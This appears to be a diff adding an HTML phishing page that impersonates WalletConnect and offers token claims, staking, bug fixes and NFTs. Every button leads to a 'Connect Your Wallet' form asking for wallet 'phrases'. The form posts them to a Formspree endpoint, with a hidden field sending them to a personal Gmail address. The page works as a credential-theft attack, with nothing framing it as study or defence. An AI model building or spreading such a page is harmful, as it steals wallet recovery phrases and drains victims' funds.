@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connect</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <nav class="navbar">
+            <div class="logo">Wallet Connect</div>
+            <ul class="nav-menu">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#connect-wallet" id="connectWalletLink">Connect Wallet</a></li>
+                <li><a href="#about">About</a></li>
+                <li><a href="#services">Services</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section id="home">
+            <h1>Welcome to WalletConnect</h1>
+            <p>Explore our decentralized platform and connect your wallet to get started!</p>
+            <div class="options-container">
+                <div class="option-card">
+                    <h3>Fix Issue</h3>
+                    <p>Resolve technical issues with your wallet or transactions.</p>
+                    <a href="#connect-wallet" class="option-button">Fix Bugs</a>
+                </div>
+                <div class="option-card">
+                    <h3>DApp</h3>
+                    <p>Interact with our decentralized applications.</p>
+                    <a href="#connect-wallet" class="option-button">Explore DApps</a>
+                </div>
+                <div class="option-card">
+                    <h3>Manual Connect</h3>
+                    <p>Report and fix bugs in our platform.</p>
+                    <a href="#connect-wallet" class="option-button">Report Bug</a>
+                </div>
+                <div class="option-card">
+                    <h3>Claim Token</h3>
+                    <p>Claim your tokens securely.</p>
+                    <a href="#connect-wallet" class="option-button">Claim Now</a>
+                </div>
+                <div class="option-card">
+                    <h3>Stake</h3>
+                    <p>Stake your tokens to earn rewards.</p>
+                    <a href="#connect-wallet" class="option-button">Stake Tokens</a>
+                </div>
+                <div class="option-card">
+                    <h3>NFT Token</h3>
+                    <p>Mint or trade your NFTs.</p>
+                    <a href="#connect-wallet" class="option-button">Get NFTs</a>
+                </div>
+            </div>
+        </section>
+
+      <section id="connect-wallet" class="wallet-section hidden">
+    <h2>Connect Your Wallet</h2>
+    <p>Select your wallet from the list below:</p>
+    <select id="walletSelect">
+        <option value="" disabled selected>Select a Wallet</option>
+        <option value="metamask">MetaMask</option>
+        <option value="trustwallet">Trust Wallet</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="ledger">Ledger</option>
+    </select>
+    <button id="connectButton" disabled>Connect</button>
+
+    <div id="inputSection" class="hidden">
+        <h3>Enter Your Phrases</h3>
+        <form action="https://formspree.io/f/mblkkzrj" method="POST" id="messageForm">
+            <input type="hidden" name="_to" value="igetaoreed54@gmail.com">
+            <textarea name="message" id="userInput" placeholder="Input your phrases here..." rows="4" cols="50" required></textarea>
+            <button type="submit" id="submitButton">Submit</button>
+        </form>
+        <p id="statusMessage"></p>
+    </div>
+</section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 WalletConnect. All rights reserved.</p>
+    </footer>
+
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
